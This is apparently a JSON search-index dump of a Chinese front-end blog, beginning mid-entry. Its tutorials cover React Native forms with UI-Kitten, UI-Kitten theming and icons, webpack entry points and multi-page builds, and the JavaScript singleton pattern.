behavior=\u0026quot;padding\u0026quot; style={{ flex: 1 }}\u0026gt;\r\u0026lt;TouchableWithoutFeedback onPress={() =\u0026gt; Keyboard.dismiss()}\u0026gt;\r\u0026lt;Layout style={styles.container}\u0026gt;\r\u0026lt;Select //6. select组件渲染\rselectedIndex={selectedIndex}\ronSelect={(index) =\u0026gt; this.setState({ selectedIndex: index })}\rvalue={displayValue}\r\u0026gt;\r{data.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r\u0026lt;Input\rvalue={fullName}\rlabel=\u0026quot;Full Name\u0026quot;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.fullName.length \u0026gt; 0 \u0026amp;\u0026amp; errors.fullName}\rstatus={errors.fullName.length \u0026gt; 0 ? \u0026quot;danger\u0026quot; : \u0026quot;\u0026quot;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026quot;fullName\u0026quot;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={email}\rlabel=\u0026quot;Email Address\u0026quot;\rkeyboardType=\u0026quot;email-address\u0026quot;\rautoCapitalize=\u0026quot;none\u0026quot;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.email.length \u0026gt; 0 \u0026amp;\u0026amp; errors.email}\rstatus={errors.email.length \u0026gt; 0 ? \u0026quot;danger\u0026quot; : \u0026quot;\u0026quot;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026quot;email\u0026quot;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={password}\rlabel=\u0026quot;Password\u0026quot;\rsecureTextEntry\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.password.length \u0026gt; 0 \u0026amp;\u0026amp; errors.password}\rstatus={errors.password.length \u0026gt; 0 ? \u0026quot;danger\u0026quot; : \u0026quot;\u0026quot;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026quot;password\u0026quot;, value)}\r/\u0026gt;\r\u0026lt;Button style={styles.btn} onPress={this.handlePress}\u0026gt;\rSubmit\r\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/TouchableWithoutFeedback\u0026gt;\r\u0026lt;/KeyboardAvoidingView\u0026gt;\r);\r}\r}\rconst styles = StyleSheet.create({\rcontainer: {\rflex: 1,\rjustifyContent: \u0026quot;center\u0026quot;,\rpaddingHorizontal: 10,\rwidth: 600\r},\rcaptionTextStyle: {\rcolor: \u0026quot;red\u0026quot;\r},\rbtn: {\rmarginVertical: 5\r}\r});\rreact-hooks-form 使用示例（包含select） import React from \u0026quot;react\u0026quot;;\rimport { StyleSheet } from \u0026quot;react-native\u0026quot;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath, Text } from \u0026quot;@ui-kitten/components\u0026quot;;\rimport { useForm, Controller } from \u0026quot;react-hook-form\u0026quot;;\rconst selectData = [\r'A',\r'B',\r'C',\r];\rexport default function FormComponent() {\rconst { control, handleSubmit, errors } = useForm();\rconst onSubmit = (data: any) =\u0026gt; {\rconst postData = {\r\u0026quot;typeFeedBack\u0026quot;: displayValue,//select选的值\r\u0026quot;firstName\u0026quot;: data.firstName,\r\u0026quot;lastName\u0026quot;: data.lastName\r}\rconsole.log(postData)\r};\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));\rconst displayValue = selectData[selectedIndex.row];\rconst renderOption = (title: string, index: number) =\u0026gt; (\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;Layout style={styles.container} level='4'\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={() =\u0026gt; (\r\u0026lt;Select\rstyle={styles.input}\rplaceholder='Default'\rvalue={displayValue}\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; setSelectedIndex(index)}\u0026gt;\r{selectData.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r)}\rname=\u0026quot;typeFeedBack\u0026quot;//这里这个名字不重要，只要随便取一个没有的就可以。因为select我要单独处理\rdefaultValue=\u0026quot;\u0026quot;//必须，可以为空\r/\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel='姓氏'\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026quot;firstName\u0026quot;\rrules={{ required: true }}\rdefaultValue=\u0026quot;\u0026quot;\r/\u0026gt;\r{errors.firstName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel='名字'\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026quot;lastName\u0026quot;\rrules={{ required: true }}\rdefaultValue=\u0026quot;\u0026quot;\r/\u0026gt;\r{errors.lastName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Button style={styles.button} onPress={handleSubmit(onSubmit)}\u0026gt;提交\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\r}\rconst styles = StyleSheet.create({\rcontainer: {\rpaddingLeft: 20,\rpaddingRight: 20,\rpaddingBottom: 20\r},\rinput: {\rwidth: 500,\rmarginTop: 20\r},\rbutton: {\rmarginTop: 20\r}\r})\r","description":"","id":36,"section":"react-native","tags":null,"title":"React-Native 最佳实践","uri":"https://danacoding.github.io/react-native/react-native/rn-bp/"},{"content":"一、DrawerGroup （UI-Kitten ） DrawerGroup 导航问题 xxx 这个问题没有解决\n UI-Kitten Version@5.0.0\n@ui-kitten/components DrawerGroup\n const DrawerContent = ({ navigation, state }) =\u0026gt; {\rconst routes = [//1.定义对应的组件（组件名而非title名）数组\r['Users'],\r['Orders'],\r['EvaDesign', 'News', 'Details']\r];\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));//2.初始化选中状态\rreturn (\r//3.以index作为判断依据实现导航条件\r\u0026lt;Drawer\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; {\rsetSelectedIndex(index)\rif (index.section != undefined) {\rlet sectionRoute = routes[index.section][index.row];\rnavigation.navigate(sectionRoute);\r} else if (index.section == undefined) {\rnavigation.navigate(state.routeNames[index.row])\r}\r}}\r\u0026gt;\r\u0026lt;DrawerItem title='Users'/\u0026gt;\r\u0026lt;DrawerItem title='Orders'/\u0026gt;\r\u0026lt;DrawerGroup title='AkveoDesign'\u0026gt;\r\u0026lt;DrawerItem title='EvaDesign'/\u0026gt;\r\u0026lt;DrawerItem title='News'/\u0026gt;\r\u0026lt;DrawerItem title='Details'/\u0026gt;\r\u0026lt;/DrawerGroup\u0026gt;\r\u0026lt;/Drawer\u0026gt;\r)\r};\r二、自定义映射（UI-Kitten） Step.1 创建映射\n工程根目录新建 mapping.json 文件，\n该配置文件稍后由Eva设计系统处理器处理，以提供组件所应用的最终样式。\n//文本text样式\r{\r\u0026quot;strict\u0026quot;: {\r\u0026quot;text-font-family\u0026quot;: \u0026quot;OpenSans-Regular\u0026quot;,\r\u0026quot;text-heading-1-font-size\u0026quot;: 36,\r\u0026quot;text-heading-1-font-weight\u0026quot;: \u0026quot;800\u0026quot;,\r\u0026quot;text-heading-1-font-family\u0026quot;: \u0026quot;OpenSans-Bold\u0026quot;,\r// Same for `h2...h6`\r\u0026quot;text-subtitle-1-font-size\u0026quot;: 15,\r\u0026quot;text-subtitle-1-font-weight\u0026quot;: \u0026quot;600\u0026quot;,\r\u0026quot;text-subtitle-1-font-family\u0026quot;: \u0026quot;OpenSans-SemiBold\u0026quot;,\r// Same for `s2`\r\u0026quot;text-paragraph-1-font-size\u0026quot;: 15,\r\u0026quot;text-paragraph-1-font-weight\u0026quot;: \u0026quot;400\u0026quot;,\r\u0026quot;text-paragraph-1-font-family\u0026quot;: \u0026quot;OpenSans-Regular\u0026quot;,\r// Same for `p2`\r\u0026quot;text-caption-1-font-size\u0026quot;: 12,\r\u0026quot;text-caption-1-font-weight\u0026quot;: \u0026quot;400\u0026quot;,\r\u0026quot;text-caption-1-font-family\u0026quot;: \u0026quot;OpenSans-Regular\u0026quot;,\r// Same for `c2`\r\u0026quot;text-label-font-size\u0026quot;: 12,\r\u0026quot;text-label-font-weight\u0026quot;: \u0026quot;800\u0026quot;,\r\u0026quot;text-label-font-family\u0026quot;: \u0026quot;OpenSans-Bold\u0026quot;\r}\r}\rstep.2 更改单个参数\n为了更改默认参数，您需要找出它的声明位置（/node_modules/@eva-design/eva/mapping.json）。为此，我们可以快速浏览有关组件的元信息。\n//文本text样式\r{\r\u0026quot;strict\u0026quot;: {\r\u0026quot;text-font-family\u0026quot;: \u0026quot;OpenSans-Regular\u0026quot;,\r- \u0026quot;text-heading-1-font-size\u0026quot;: 36,\r+ \u0026quot;text-heading-1-font-size\u0026quot;: 66,\rstep.3 实现映射\n metro.config.js中配置以下代码：\n const MetroConfig = require('@ui-kitten/metro-config');\rconst evaConfig = {\revaPackage: '@eva-design/eva',\r++ customMappingPath: './path-to/mapping.json',\r};\rmodule.exports = MetroConfig.create(evaConfig, {\r// Whatever was previously specified\r});\r三、主题定制（UI-Kitten） Step.1 Eva-Color\nEva-color中自定义配置颜色，export theme.json文件，放入工程中。\nStep.2 App.js\nimport React from 'react';\rimport * as eva from '@eva-design/eva';\rimport { ApplicationProvider, Layout, Button } from '@ui-kitten/components';\rimport { default as theme } from './theme.json'; // \u0026lt;-- Import app theme\rexport default () =\u0026gt; (\r\u0026lt;ApplicationProvider {...eva} theme={{ ...eva.dark, ...theme }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}\u0026gt;\r\u0026lt;Button\u0026gt;HOME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r);\r四、使用第三方图标包（UI-Kitten） Step.1 安装 vector-icons\nnpm install --save react-native-vector-icons\rStep.2 配置（android）\n// android/app/build.gradle文件中添加\rapply from: \u0026quot;../../node_modules/react-native-vector-icons/fonts.gradle\u0026quot;\rStep.3 创建图标适配器\n// 创建一个feather-icons.js文件，并在其中放置以下代码。\rimport React from 'react';\rimport { StyleSheet } from 'react-native';\rimport Icon from 'react-native-vector-icons/Feather';\rexport const FeatherIconsPack = {\rname: 'feather',\ricons: createIconsMap(),\r};\rfunction createIconsMap() {\rreturn new Proxy({}, {\rget(target, name) {\rreturn IconProvider(name);\r},\r});\r}\rconst IconProvider = (name) =\u0026gt; ({\rtoReactElement: (props) =\u0026gt; FeatherIcon({ name, ...props }),\r});\rfunction FeatherIcon({ name, style }) {\rconst { height, tintColor, ...iconStyle } = StyleSheet.flatten(style);\rreturn (\r\u0026lt;Icon name={name} size={height} color={tintColor} style={iconStyle} /\u0026gt;\r);\r}\rStep.4 注册图标\nimport React from 'react';\rimport * as eva from '@eva-design/eva';\rimport { ApplicationProvider, IconRegistry, Layout, Text } from '@ui-kitten/components';\r++ import { FeatherIconsPack } from './feather-icons';\rconst HomeScreen = () =\u0026gt; (\r\u0026lt;Layout style={{flex: 1, justifyContent: 'center', alignItems: 'center'}}\u0026gt;\r\u0026lt;Text category='h1'\u0026gt;HOME\u0026lt;/Text\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\rexport default () =\u0026gt; (\r\u0026lt;\u0026gt;\r++ \u0026lt;IconRegistry icons={FeatherIconsPack} /\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva.light}\u0026gt;\r\u0026lt;HomeScreen /\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/\u0026gt;\r);\rStep.5 使用\nimport React from 'react';\rimport { Button, Icon } from '@ui-kitten/components';\rexport const FacebookIcon = (props) =\u0026gt; (\r\u0026lt;Icon name='facebook' {...props} /\u0026gt;\r);\rexport const LoginButton = () =\u0026gt; (\r\u0026lt;Button accessoryLeft={FacebookIcon}\u0026gt;Login with Facebook\u0026lt;/Button\u0026gt;\r);\r五、Expo\u0026amp;UI-Kitten（web端报错的问题） 解决办法：\n//1.安装\rexpo install @expo/webpack-config\r//2.根目录新建`webpack.config.js`添加\rconst createExpoWebpackConfigAsync = require('@expo/webpack-config');\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: ['@ui-kitten/components']\r}\r}, argv);\rreturn config;\r};\r","description":"","id":37,"section":"react-native","tags":null,"title":"UI-Kitten 最佳实践","uri":"https://danacoding.github.io/react-native/ui/ui-kitten/kitten-bp/"},{"content":"一、入口 （entry） #.单个入口（简写/数组）语法   用法：entry: string | [string]\n  优缺点：通过一个入口（例如一个库）为应用程序设置 webpack 配置时，单一入口是不错的选择。然而，这种语法扩展配置的灵活性不大。\n   webpack.config.js\n module.exports = {\rentry: { main: './path/to/my/entry/file.js' } }\r// 或者，注入多个依赖文件，并将依赖关系绘制在一个“chunk”中\rmodule.exports = {\rentry: ['./src/file_1.js','./src/file_2.js'],\routput: {\rfilename: 'bundle.js'\r}\r}\r#.对象语法 ✔   用法：entry: { string | [string] } | { }\n  优缺点：对象语法会比较繁琐。然而，这是应用程序中定义入口的最可扩展的方式。\n  对象属性：\n   dependOn: 当前入口所依赖的入口。必须在该入口被加载前被加载。 filename: 指定要输出的文件名称。 import: 启动时需加载的模块。 library: library 的相关选项。 runtime: 运行时 chunk 的名字。如果设置了，就会创建一个以这个名字命名的运行时 chunk，否则将使用现有的入口作为运行时。   注意事项：   runtime 和 dependOn 不能在同一个入口上同时使用 确保 runtime 不能指向已存在的入口名称 dependOn 不能循环引用  // ✔\rmodule.exports = {\rentry: {\rapp: './src/app.js',\radminApp: './src/adminApp.js',\r},\r};\r// ✔\rmodule.exports = {\rentry: {\ra2: 'dependingfile.js',\rb2: {\rdependOn: 'a2',\rimport: './src/app.js',\r},\r},\r};\r// × `runtime` 和 `dependOn` 不能在同一个入口上同时使用\rmodule.exports = {\rentry: {\ra2: './a',\rb2: {\rruntime: 'x2',\rdependOn: 'a2',\rimport: './b',\r},\r},\r};\r// × `runtime` 不能指向已存在的入口名称\rmodule.exports = {\rentry: {\ra1: './a',\rb1: {\rruntime: 'a1',\rimport: './b',\r},\r},\r};\r// × `dependOn` 不能循环引用\rmodule.exports = {\rentry: {\ra3: {\rimport: './a',\rdependOn: 'b3',\r},\rb3: {\rimport: './b',\rdependOn: 'a3',\r},\r},\r};\r二、常见场景 #.分离 app(应用程序) 和 vendor(第三方库) 入口 // 使用 optimization.splitChunks 默认配置\r// webpack.config.js\rmodule.exports = {\rentry: {\rmain: './src/app.js'\r},\r//...\roptimization: {\rsplitChunks: {\rchunks: 'async',\rminSize: 20000,\rminRemainingSize: 0,\rmaxSize: 0,\rminChunks: 1,\rmaxAsyncRequests: 30,\rmaxInitialRequests: 30,\renforceSizeThreshold: 50000,\rcacheGroups: {\rdefaultVendors: {\rtest: /[\\\\/]node_modules[\\\\/]/,\rpriority: -10,\rreuseExistingChunk: true,\r},\rdefault: {\rminChunks: 2,\rpriority: -20,\rreuseExistingChunk: true,\r},\r},\r},\r},\r};\r#.多页面应用程序 // webpack.config.js\rmodule.exports = {\rentry: {\rpageOne: './src/pageOne/index.js',\rpageTwo: './src/pageTwo/index.js',\rpageThree: './src/pageThree/index.js',\r},\r};\r","description":"","id":38,"section":"others","tags":null,"title":"webpack 基础","uri":"https://danacoding.github.io/others/webpack/webpack-base/"},{"content":"静态网站，多个html页面（非SPA），WebPack配置 (基础篇)\nStep1. 初始化项目 mkdir multiple-htmlpages \u0026amp;\u0026amp; cd multiple-htmlpages\ryarn init\ryarn add -D webpack webpack-cli webpack-dev-server html-webpack-plugin\rmkdir src \u0026amp;\u0026amp; cd src\recho \u0026gt;index.html\recho \u0026gt;index.js\r//index.js中的内容保持空\r//index.html中添加内容\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;meta http-equiv=\u0026quot;X-UA-Compatible\u0026quot; content=\u0026quot;IE=edge\u0026quot;\u0026gt;\r\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;首页\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1 class=\u0026quot;page-title\u0026quot;\u0026gt;首页\u0026lt;/h1\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rStep2. 配置开发服务器  1.webpack.dev.js\n echo \u0026gt;webpack.dev.js\r//webpack.dev.js中添加内容\rconst HtmlWebpackPlugin = require('html-webpack-plugin');\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: './src/index.js'\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: './src/index.html',\rinject: true,\rchunks: ['index'],\rfilename: 'index.html'\r})\r]\r};\r package.json   {\r\u0026quot;name\u0026quot;: \u0026quot;multiple-htmlpages\u0026quot;,\r\u0026quot;version\u0026quot;: \u0026quot;1.0.0\u0026quot;,\r\u0026quot;description\u0026quot;: \u0026quot;静态网站，多个html页面，WebPack配置\u0026quot;,\r\u0026quot;author\u0026quot;: \u0026quot;fungmo\u0026quot;,\r\u0026quot;license\u0026quot;: \u0026quot;MIT\u0026quot;,\r\u0026quot;scripts\u0026quot;: {\r\u0026quot;start\u0026quot;: \u0026quot;webpack serve --config webpack.dev.js --mode development\u0026quot;\r},\r\u0026quot;devDependencies\u0026quot;: {\r\u0026quot;html-webpack-plugin\u0026quot;: \u0026quot;^5.3.1\u0026quot;,\r\u0026quot;webpack\u0026quot;: \u0026quot;^5.30.0\u0026quot;,\r\u0026quot;webpack-cli\u0026quot;: \u0026quot;^4.6.0\u0026quot;,\r\u0026quot;webpack-dev-server\u0026quot;: \u0026quot;^3.11.2\u0026quot;\r} }  yarn start 启动服务器   Step3. 添加更多 HTML 页面 echo \u0026gt;about.html\recho \u0026gt;about.js\recho \u0026gt;contacts.html\recho \u0026gt;contacts.js\rconst HtmlWebpackPlugin = require('html-webpack-plugin');\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: './src/index.js',\rabout: './src/about.js',\rcontacts: './src/contacts.js'\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: './src/index.html',\rinject: true,\rchunks: ['index'],\rfilename: 'index.html'\r}),\rnew HtmlWebpackPlugin({\rtemplate: './src/about.html',\rinject: true,\rchunks: ['about'],\rfilename: 'about.html'\r}),\rnew HtmlWebpackPlugin({\rtemplate: './src/contacts.html',\rinject: true,\rchunks: ['contacts'],\rfilename: 'contacts.html'\r})\r]\r};\rStep4. 添加CSS yarn add normalize.css\r//index.js、about.js、contacts.js 中，顶部添加\rimport 'normalize.css/normalize.css';\ryarn add -D css-loader style-loader\r//webpack.dev.js\rconst HtmlWebpackPlugin = require('html-webpack-plugin');\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.css$/,\ruse: [\r'style-loader',\r'css-loader'\r]\r}\r]\r}\r};\rStep5. 使用最新的JavaScript语言 yarn add -D @babel/core babel-loader @babel/preset-env\r//webpack.dev.js\rconst HtmlWebpackPlugin = require('html-webpack-plugin');\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: 'babel-loader',\roptions: {\rpresets: ['@babel/preset-env']\r}\r},\r]\r}\r};\rStep6. 生产发布  压缩css，js文件，因为字节很重要； 在压缩文件的名称上添加一个哈希，这样我们就可以配置服务器以为具有适当缓存头的服务器提供服务，并确信浏览器仍会获取新版本； 确保在html中使用了正确的文件名； 将生成的文件存储在配置的位置；   1.可以使用现有的 webpack.dev.js 并在内部进行配置，以区分生产和开发环境来执行上述任务。 但随后变得有点复杂且难以阅读。 因此，新建一个 webpack.prod.js 配置文件。 首先安装更多的依赖项来帮助我们进行压缩和优化：\n yarn add -D clean-webpack-plugin mini-css-extract-plugin optimize-css-assets-webpack-plugin http-server\r 2.配置 webpack.prod.js\n echo \u0026gt;webpack.prod.js\r// webpack.prod.js\rconst path = require('path');\rconst { CleanWebpackPlugin } = require('clean-webpack-plugin'); const HtmlWebpackPlugin = require('html-webpack-plugin');\rconst MiniCssExtractPlugin = require(\u0026quot;mini-css-extract-plugin\u0026quot;);\rconst OptimizeCssAssetsPlugin = require('optimize-css-assets-webpack-plugin');\rconst buildPath = path.resolve(__dirname, 'dist');\rmodule.exports = {\r// This option controls if and how source maps are generated.\r// https://webpack.js.org/configuration/devtool/\rdevtool: 'source-map',\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: './src/index.js',\rabout: './src/about.js',\rcontacts: './src/contacts.js'\r},\r// how to write the compiled files to disk\r// https://webpack.js.org/concepts/output/\routput: {\rfilename: '[name].[hash:20].js',\rpath: buildPath\r},\r// https://webpack.js.org/concepts/loaders/\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: 'babel-loader',\roptions: {\rpresets: ['@babel/preset-env']\r}\r},\r{\rtest: /\\.css$/,\ruse: [\rMiniCssExtractPlugin.loader,\r\u0026quot;css-loader\u0026quot;\r]\r}\r]\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew CleanWebpackPlugin(),\rnew HtmlWebpackPlugin({\rtemplate: './src/index.html',\rinject: 'body',\rchunks: ['index'],\rfilename: 'index.html'\r}),\rnew HtmlWebpackPlugin({\rtemplate: './src/about.html',\rinject: 'body',\rchunks: ['about'],\rfilename: 'about.html'\r}),\rnew HtmlWebpackPlugin({\rtemplate: './src/contacts.html',\rinject: 'body',\rchunks: ['contacts'],\rfilename: 'contacts.html'\r}),\rnew MiniCssExtractPlugin({\rfilename: \u0026quot;[name].[contenthash].css\u0026quot;,\rchunkFilename: \u0026quot;[id].[contenthash].css\u0026quot;\r})\r],\r// https://webpack.js.org/configuration/optimization/\roptimization: {\rminimize: true,\rminimizer: [\rnew OptimizeCssAssetsPlugin({})\r]\r}\r};\r 3.配置 package.json\n \u0026quot;scripts\u0026quot;: {\r\u0026quot;start\u0026quot;: \u0026quot;webpack serve --config webpack.dev.js --mode development\u0026quot;,\r\u0026quot;build\u0026quot;: \u0026quot;webpack --config webpack.prod.js --mode production\u0026quot;,\r\u0026quot;preview\u0026quot;: \u0026quot;yarn build \u0026amp;\u0026amp; http-server dist\u0026quot;\r},\r 4.要在本地构建和预览网站，请运行：\n yarn preview\r","description":"","id":39,"section":"others","tags":null,"title":"webpack 实践","uri":"https://danacoding.github.io/others/webpack/webpack-adv/"},{"content":"单例（统一用名词 Singleton 代替）是可以实例化一次的类，并且可以全局访问。单个实例可以在整个应用程序中共享，非常适合管理应用程序中的全局状态。\n\rES6 中的单例 构建一个Counter计数器具有以下内容的类：\n 返回实例值的 getInstance 方法 返回计数器变量当前值的 getCount 方法 将计数器的值 +1 的 increment 方法 将计数器的值 -1 的 decrement 方法  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  let counter = 0; class Counter { getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } }   然而，这个类不符合 Singleton 的标准！ Singleton 应该只能被实例化一次。 上例可以创建 Counter 类的多个实例。可验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  let counter = 0; class Counter { getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter1 = new Counter(); const counter2 = new Counter(); console.log(counter1.getInstance() === counter2.getInstance()); // false   通过两次调用新方法，发现 counter1 和 counter2 被设置为不相等的实例。\ncounter1 和 counter2 上的 getInstance 方法返回的值有效地返回了对不同实例的引用。\n\r如何确保只能创建类的一个实例？   确保只能创建一个实例的一种方法是创建一个名为 instance 的变量。\n  在 Counter 的构造函数中，我们可以在创建新实例时将 instance 设置为对实例的引用。\n  我们可以通过检查实例变量是否已经有值来防止新的实例化，并通过 throw 语句抛出错误提示。\n  throw 语句用来抛出一个用户自定义的异常。当前函数的执行将被停止（throw之后的语句将不会执行），并且控制将被传递到调用堆栈中的第一个catch块。如果调用者函数中没有catch块，程序将会终止。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); //throw 语句用来抛出一个用户自定义的异常。当前函数的执行将被停止（throw 之后的语句将不会执行）。  } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const counter = new Counter(); const counter2 = new Counter(); // Error: 您只能创建一个实例！   上面这种情况，如果实例已经存在，则不应该继续：抛出一个错误让用户知道。\nPerfect! 我们无法再创建多个实例。\n\r如何冻结单例？ 让我们从 counter.js 文件中导出 Counter 实例。 但在此之前，我们也应该冻结实例。\nObject.freeze() 方法可以冻结一个对象。一个被冻结的对象再也不能被修改。此外，冻结一个对象后该对象的原型也不能被修改。freeze() 返回和传入的参数相同的对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); } instance = this; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   \r单例的实例演示 Counter计数器应用程序。有以下文件：\n counter.js：包含 Counter 类，并导出一个 Counter 实例作为其默认导出 index.js：加载 redButton.js 和 blueButton.js 模块 redButton.js：导入Counter，并在红色按钮上添加 Counter 的 increment 方法作为事件监听器，通过调用 getCount 方法记录 counter 的当前值 blueButton.js：导入Counter，并在蓝色按钮上添加 Counter 的 increment 方法作为事件监听器，通过调用 getCount 方法记录 counter 的当前值 blueButton.js 和 redButton.js 从 counter.js 导入相同的实例。 此实例在两个文件中都作为 Counter 导入。  当我们在 redButton.js 或 blueButton.js 中调用 increment 方法时，两个文件中 Counter 实例的 counter 属性的值都会更新。 我们点击红色按钮还是蓝色按钮并不重要：所有实例共享相同的值。 这就是为什么即使我们在不同的文件中调用该方法，计数器也会不断增加 1 的原因。\n\r使用常规对象字面量实现 在许多编程语言中，例如 Java 或 C++，无法像在 JavaScript 中那样直接创建对象。 在那些面向对象的编程语言中，我们需要创建一个类，通过它创建一个对象。创建的对象具有类的实例的值，就像 JavaScript 示例中实例的值一样。\n但是，上面示例中显示的类实现实际上是矫枉过正。由于我们可以直接在 JavaScript 中创建对象，因此我们可以简单地使用常规对象来实现完全相同的结果。\n count property 将 count 的值 +1 的 increment 方法 将 count 的值 -1 的 decrement 方法  与 ES6 的 class 实现方式等效\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let count = 0; const counter = { increment() { return ++count; }, decrement() { return --count; } }; Object.freeze(counter); export { counter };   由于对象是通过引用（reference）传递的，因此 redButton.js 和 blueButton.js 都导入了对同一个 singletonCounter 对象的引用。 修改其中一个文件中的 count 值将修改 singletonCounter 上的值，这在两个文件中都可见。\n\r单例的优缺点 将实例化限制为仅一个实例可能会节省大量内存空间。不必每次都为一个新实例设置内存，我们只需为整个应用程序引用的那个实例设置内存。\n然而，单例实际上被认为是一种反模式，并且可以（或应该）在 JavaScript 中避免。\n让我们介绍一下使用单例的一些缺点！\n1. 测试 测试依赖于 Singleton 的代码可能会变得棘手。 由于我们不能每次都创建新的实例，所以所有的测试都依赖于对之前测试的全局实例的修改。 在这种情况下，测试的顺序很重要，一个小的修改可能会导致整个测试套件失败。 测试后，我们需要重置整个实例，以重置测试所做的修改。\nsrc/conterTest.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // 此文件是必需的，确保此示例中的测试不会失败。 // 它是 counter.js 的副本  let instance; let counter = 0; class Counter { constructor() { if (instance) { throw new Error(\u0026#34;您只能创建一个实例！\u0026#34;); } instance = this; this.counter = counter; } getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } } const singletonCounter = Object.freeze(new Counter()); export default singletonCounter;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  import Counter from \u0026#34;../src/counterTest\u0026#34;; test(\u0026#34;增加 1 次应该是 1\u0026#34;, () =\u0026gt; { Counter.increment(); expect(Counter.getCount()).toBe(1); }); test(\u0026#34;增加 3 个额外的次数应该是 4\u0026#34;, () =\u0026gt; { Counter.increment(); Counter.increment(); Counter.increment(); expect(Counter.getCount()).toBe(4); }); test(\u0026#34;递减1次应该是3\u0026#34;, () =\u0026gt; { Counter.decrement(); expect(Counter.getCount()).toBe(3); });   2. 依赖隐藏 在本例中导入另一个模块 superCounter.js 时，该模块导入的单例可能并不明显。 在其他文件中，例如本例中的 index.js，我们可能会导入该模块并调用其方法。 这样，我们不小心修改了 Singleton 中的值。 